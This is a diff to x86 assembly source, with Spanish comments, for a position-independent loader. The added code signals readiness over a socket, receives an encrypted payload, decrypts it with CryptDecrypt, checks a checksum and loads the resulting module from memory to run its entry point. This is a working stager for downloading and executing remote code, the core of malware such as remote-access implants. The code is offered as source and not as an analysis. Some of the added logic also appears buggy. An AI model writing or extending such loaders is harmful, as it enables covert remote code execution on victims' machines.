@@ -3,6 +3,7 @@
 			
 	%include "loader.inc"
 	%include "kernel32.inc"
+	%include "net.inc"
 			
 			
 	section code USE32
@@ -16,6 +17,8 @@
 	;//los cambios en los registros que hacen muchas apis.Tambien esta el macro ecall2 que es igual	//
 	;//que el anterior, pero no las declara como externas											//
 	;/////////////////////////////////////////////////////////////////////////////////////////////////
+	
+	
 			
 			
 	nop
@@ -65,7 +68,6 @@ endl
 	mov [ebx+esi+1],eax
 	
 	
-			
 	;//Preparo la FuncTable para inicializarla
 	lea ecx,%$FuncTable
 	;//Coloco en su sitio estas funciones que son imprescindibles
@@ -88,67 +90,32 @@ endl
 	mov [ecx+LoaderFunTable.GetProcAddress],eax
 			
 			
-	;//Busco las direcciones de las funciones que posteriormente usare
-	push VirtualAllocN
-	add [esp],esi
-	push dword %$kernel32
-	ecall2 GetProcAddress
-			
-	mov ebx,VirtualAlloc
-	mov [ebx+esi+1],eax	
+	;//Cargo las funtionTables
 	
-	push VirtualFreeN
+	;//Kernel32
+	push esi
+	push kernel32FuncTable
 	add [esp],esi
-	push dword %$kernel32
-	ecall2 GetProcAddress
-			
-	mov ebx,VirtualFree
-	mov [ebx+esi+1],eax	
-			
-	push ExitProcessN
-	add [esp],esi
-	push dword %$kernel32
-	ecall2 GetProcAddress
-			
-	mov ebx,ExitProcess
-	mov [ebx+esi+1],eax	
-			
-	push TlsAllocN
-	add [esp],esi
-	push dword %$kernel32
-	ecall2 GetProcAddress
-			
-	mov ebx,TlsAlloc
-	mov [ebx+esi+1],eax	
-			
-	push TlsSetValueN
-	add [esp],esi
-	push dword %$kernel32
-	ecall2 GetProcAddress
-			
-	mov ebx,TlsSetValue
-	mov [ebx+esi+1],eax	
-			
-	push msvcrtN
-	add [esp],esi
-	ecall2 LoadLibraryA
-	;mov dword %$msvcrt,eax
-			
-	push mallocN
-	add [esp],esi
-	push eax
-	ecall2 GetProcAddress
-			
-	mov ebx,malloc
-	mov [ebx+esi+1],eax	
+	call loadFuntionTable
 	
-	push freeN
+	;//biblioteca de c
+	push esi
+	push msvcrtFuncTable
 	add [esp],esi
-	push eax
-	ecall2 GetProcAddress
+	call loadFuntionTable
+	
+	;//socket
+	push esi
+	push ws2_32FuncTable
+	add [esp],esi
+	call loadFuntionTable
+	
+	;//Funciones de cifrado
+	push esi
+	push advapi32FuncTable
+	add [esp],esi
+	call loadFuntionTable
 			
-	mov ebx,free
-	mov [ebx+esi+1],eax	
 	;Ahora toca relocalizar el codigo estatico que pueda quedar
 	;PUSH_RELOC_0
 	mov eax,PUSH_RELOC_0
@@ -158,8 +125,32 @@ endl
 	add [eax+esi+1],esi
 			
 			
-	mov eax,EOF
-	add eax,esi
+	;//Mando el OK para que el cliente sepa que estoy listo
+	push dword %$hConexion
+	call sendOK
+	
+	;//Recivo el playload
+	push dword %$hConexion
+	call readPlayload
+	;//Devuelve una estructura Playload o zero
+	test eax,eax
+	jz .ExitError
+	mov edx,eax		;//EDX = Playload
+	
+	;Desencripto
+	push edx
+	push dword %$hKey
+	call decrypt
+	
+	;//Calculo el CheckSum
+	push edx
+	call calcCheckSum
+	mov edx,[edx+Playload.checksum]	;//edx = CheckSum recivido
+	cmp eax,edx					;//eax = CheckSum calculado
+	jne .ExitError
+	;//Si coincide sigo
+	
+	lea eax,[edx+Playload.data];// EAX = Direccion del modulo a cargar
 	;//Cargo el plugin loader
 	push PluginLoaderName
 	add [esp],esi
@@ -170,6 +161,10 @@ endl
 	mov ebx, eax
 	;//Aqui se devuelve la direccion base del modulo cargado
 			
+	;//Livero la estructura Playload
+	
+	push edx
+	ecall2 free
 			
 	;//Se buscar aqui la funcion de entrada
 	push PluginLoaderEntry
@@ -262,6 +257,181 @@ endl
 			
 	popad
 endp
+
+proc calcCheckSum,pPayload
+endl
+	pushad
+	mov eax,%$pPayload
+	
+	mov  esi, [eax+Playload.data]				;//ESI = pBuff = &Checksum
+    mov  ecx, [eax+Playload.checksum]			;//ECX = SizePayload
+    cdq                             ;//hash = 0
+FNV1a:
+    lodsb                           ;//al = str[i]; i++;
+    xor  dl, al                     ;//>hash ^= str[i];
+    imul edx, 0x1EF30EB             ;//>hash *= 0x1EF30EB;
+    loop FNV1a                      ;//>(len--);(len < 0)?
+    
+    return edx
+endp
+
+proc decrypt,hKey,pPlayload
+endl
+	pushad
+	
+	cdq                            ;//EDX = 0
+	
+	mov eax,%$pPlayload
+    push dword [eax+Playload.sizeEncripData] ;//Variable temporal para guardar el tamaño de los datos a leer
+
+    push esp                       ;//v
+    push dword [eax+Playload.data]       ;//v
+    push edx                       ;//v
+    push edx                       ;//v
+    push edx                       ;//v
+    push dword %$hKey              ;//v
+    ecall2 CryptDecrypt        ;//>CryptDecrypt(hKey, 0, False, 0, pBuff, &buffLen);
+    pop ecx
+	
+	;return 0
+	popad
+endp
+
+proc sendOK,hConexion
+	localdb ok
+endl
+	pushad
+	mov byte %$ok,0x01
+	
+	push 0
+	push sizeof(byte)
+	lea eax,%$ok
+	push eax
+	push dword %$hConexion
+	ecall2 send
+	
+	popad
+endp
+
+proc loadFuntionTable,funcTable,offset
+	localdd hModule
+endl
+	pushad
+	
+	mov ecx,%$funcTable
+	xor eax,eax
+	
+	cmp dword [ecx],eax
+	jz .error
+	mov esi,%$offset
+	
+	;//cargo la libreria
+	push dword [ecx]
+	add [esp],esi
+	ecall2 LoadLibraryA
+	test eax,eax
+	jz .error
+	mov %$hModule,eax
+	mov edx,eax
+	
+	.next:
+	add ecx, 4
+	cmp dword [ecx],0
+	jz .error
+	
+	;//Cargo la funcion
+	push dword [ecx]
+	add [esp],esi
+	push edx
+	ecall2 GetProcAddress
+	
+	add ecx, 4
+	cmp dword [ecx],0
+	jz .error
+	;//Guardo la direccion de la funcion
+	mov ebx,[ecx]
+	mov [ebx+1+esi],eax	
+	
+	jmp .next
+	.error:
+	
+	popad
+endp
+
+;//Lee del socket especificado y devuelve en ppBuff un puntero al buffer y en exa el tamaño de los datos leidos
+proc readPlayload,hConexion
+	localdd szBuff
+	localdd pPlayload
+	localdd szReadData
+endl
+	pushad
+	;//Inicializo la variable
+	xor eax,eax
+	;mov dword [ebx],eax
+	mov dword %$szReadData,eax
+	
+	;//Leo el primer dword que indica el tamaño de los datos a leer
+	push dword 0
+	push sizeof(DWORD)
+	lea eax,%$szBuff
+	push eax
+	push dword %$hConexion
+	ecall2 recv
+	lea ebx,%$szReadData
+	add dword [ebx],eax
+	cmp eax,-1
+	je .error
+	test eax,eax
+	jz .error
+	
+	mov ebx,%$szBuff
+	;//Añado el tamaño de el cketsum
+	;add ebx,4
+	test ebx,0xf
+	;//Calculo el tamaño del paquete que siempre es multiplo de 16
+	jz .noAling
+	shr ebx,4
+	inc ebx
+	shl ebx,4	
+	.noAling:
+	
+	push ebx
+	add dword [esp],sizeof(Playload)-sizeof(DWORD)
+	ecall2 malloc
+	mov %$pPlayload,eax
+	;//relleno los campos de Playload
+	mov [eax+Playload.sizeEncripData],ebx
+	mov ecx,%$szBuff
+	mov [eax+Playload.sizeDecriptData],ecx
+	
+	
+	;//Leo los datos disponibles de la red
+	push dword MSG_WAITALL
+	push dword ebx
+	;//pongo la direccion de Playload.data para que rellene los datos
+	push dword eax
+	add dword [esp],Playload.data
+	push dword %$hConexion
+	ecall2 recv
+	cmp eax,-1;//Compruevo los errores
+	je .error
+	test eax,eax
+	jz .error	
+	
+	jmp .noError
+	.error:
+	;//Devuelvo 0 si hay error de error
+	xor eax,eax
+	jmp .end
+	.noError:
+	;//Si no hay error devuelvo pPlayload
+	mov eax,%$pPlayload
+	.end:
+	
+	return eax
+endp
+
+
 			
 proc LoadLibraryFromMemoy, AddrBase, ModName
 	LOCALDD PE
@@ -993,7 +1163,29 @@ malloc:
 	db 0x68;push 0xffffffff
 	dd -1
 	ret
+realloc:
+	db 0x68;push 0xffffffff
+	dd -1
+	ret
 free:
+	db 0x68;push 0xffffffff
+	dd -1
+	ret
+;Funciones de red
+recv:
+	db 0x68;push 0xffffffff
+	dd -1
+	ret
+send:
+	db 0x68;push 0xffffffff
+	dd -1
+	ret
+ioctlsocket:
+	db 0x68;push 0xffffffff
+	dd -1
+	ret
+;//Funciones de encriptacion
+CryptDecrypt:
 	db 0x68;push 0xffffffff
 	dd -1
 	ret
@@ -1012,9 +1204,27 @@ EendOfFuncTable:
 			
 	msvcrtN				db "msvcrt",0
 	mallocN				db "malloc",0
+	reallocN			db "realloc",0
 	freeN				db "free",0
+	
+	ws2_32				db "ws2_32",0
+	recvN				db "recv",0
+	sendN				db "send",0
+	ioctlsocketN		db "ioctlsocket",0	
+	
+	advapi32N			db "advapi32",0
+	CryptDecryptN		db "CryptDecrypt",0
+	
 			
 	dllmain@ 			db "DllMain@12",0
 	PluginLoaderEntry	db "InitPluginLoader@12",
 	nulo 				db 0;
+	
+	kernel32FuncTable	dd kernel32N,VirtualAllocN,VirtualAlloc,VirtualFreeN,VirtualFree,VirtualProtectN,VirtualProtect,ExitProcessN,ExitProcess,TlsAllocN,TlsAlloc,TlsSetValueN,TlsSetValue,0
+	
+	msvcrtFuncTable		dd msvcrtN,mallocN,malloc,reallocN,realloc,freeN,free,0
+	
+	ws2_32FuncTable		dd ws2_32,recvN,recv,sendN,send,ioctlsocketN,ioctlsocket,0
+	
+	advapi32FuncTable	dd advapi32N,CryptDecryptN,CryptDecrypt,0
 EOF:
